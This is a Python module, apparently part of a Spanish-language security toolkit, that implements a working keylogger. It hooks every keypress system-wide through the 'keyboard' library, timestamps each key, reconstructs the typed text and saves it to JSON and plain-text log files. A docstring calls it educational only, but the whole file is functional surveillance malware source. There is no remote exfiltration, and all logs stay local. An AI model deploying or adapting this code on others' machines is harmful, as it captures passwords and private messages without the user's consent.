"""
Módulo 4: Keylogger
=====================
Registra las teclas presionadas usando la librería keyboard.

NOTA: Requiere privilegios de administrador (sudo) en Linux.
Esta herramienta es para fines educativos únicamente.
"""

import threading
import os
import json
from datetime import datetime

try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

# Estado global del keylogger
_keylogger_state = {
    'running': False,
    'hook': None,
    'keys': [],
    'start_time': None,
    'key_count': 0,
}

LOG_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'logs')

# Mapeo de teclas especiales para mejor legibilidad
SPECIAL_KEYS = {
    'space': ' [ESPACIO] ',
    'enter': '\n[ENTER]\n',
    'tab': ' [TAB] ',
    'backspace': ' [RETROCESO] ',
    'delete': ' [SUPRIMIR] ',
    'shift': '',
    'ctrl': '',
    'alt': '',
    'caps lock': ' [BLOQ MAYUS] ',
    'esc': ' [ESC] ',
    'left': ' [←] ',
    'right': ' [→] ',
    'up': ' [↑] ',
    'down': ' [↓] ',
}


def _key_callback(event):
    """
    Callback que se ejecuta cada vez que se presiona una tecla.
    """
    global _keylogger_state

    if event.event_type != 'down':
        return

    key_name = event.name
    timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]

    # Determinar la representación de la tecla
    if key_name in SPECIAL_KEYS:
        display = SPECIAL_KEYS[key_name]
        key_type = 'special'
    elif len(key_name) == 1:
        display = key_name
        key_type = 'character'
    else:
        display = f' [{key_name.upper()}] '
        key_type = 'function'

    key_info = {
        'id': len(_keylogger_state['keys']) + 1,
        'key': key_name,
        'display': display,
        'type': key_type,
        'timestamp': timestamp,
    }

    _keylogger_state['keys'].append(key_info)
    _keylogger_state['key_count'] += 1


def _save_log():
    """
    Guarda el registro de teclas en un archivo.
    """
    os.makedirs(LOG_DIR, exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filepath = os.path.join(LOG_DIR, f'keylogger_{timestamp}.json')

    # Construir el texto reconstruido
    text = ''.join(k['display'] for k in _keylogger_state['keys'])

    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump({
                'capture_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_keys': len(_keylogger_state['keys']),
                'reconstructed_text': text,
                'keys': _keylogger_state['keys']
            }, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    # También guardar texto plano
    txt_path = os.path.join(LOG_DIR, f'keylogger_{timestamp}.txt')
    try:
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write(f'=== Registro de Keylogger ===\n')
            f.write(f'Fecha: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Total de teclas: {len(_keylogger_state["keys"])}\n')
            f.write(f'{"=" * 40}\n\n')
            f.write(text)
    except Exception:
        pass


def start_keylogger():
    """
    Inicia la captura de teclas.
    """
    global _keylogger_state

    if not KEYBOARD_AVAILABLE:
        return {'error': 'La librería keyboard no está instalada. Ejecuta: pip install keyboard'}

    if _keylogger_state['running']:
        return {'error': 'El keylogger ya está en ejecución'}

    _keylogger_state['running'] = True
    _keylogger_state['keys'] = []
    _keylogger_state['key_count'] = 0
    _keylogger_state['start_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        _keylogger_state['hook'] = keyboard.hook(_key_callback)
        return {
            'status': 'Keylogger iniciado',
            'start_time': _keylogger_state['start_time'],
        }
    except Exception as e:
        _keylogger_state['running'] = False
        return {'error': f'Error al iniciar keylogger: {str(e)}. ¿Estás ejecutando con sudo?'}


def stop_keylogger():
    """
    Detiene la captura de teclas y guarda el log.
    """
    global _keylogger_state

    if not _keylogger_state['running']:
        return {'status': 'El keylogger no está en ejecución'}

    try:
        keyboard.unhook_all()
    except Exception:
        pass

    _keylogger_state['running'] = False
    _keylogger_state['hook'] = None

    # Guardar log
    _save_log()

    # Reconstruir texto
    text = ''.join(k['display'] for k in _keylogger_state['keys'])

    return {
        'status': 'Keylogger detenido',
        'keys_captured': len(_keylogger_state['keys']),
        'reconstructed_text': text[:1000],
    }


def get_keylogger_status():
    """
    Obtiene el estado actual del keylogger.
    """
    return {
        'running': _keylogger_state['running'],
        'keys_captured': len(_keylogger_state['keys']),
        'start_time': _keylogger_state['start_time'],
    }


def get_keylogger_log():
    """
    Retorna el registro de teclas capturadas.
    """
    # Reconstruir texto
    text = ''.join(k['display'] for k in _keylogger_state['keys'])

    return {
        'keys': _keylogger_state['keys'][-200:],  # Últimas 200 teclas
        'total_keys': len(_keylogger_state['keys']),
        'reconstructed_text': text,
    }
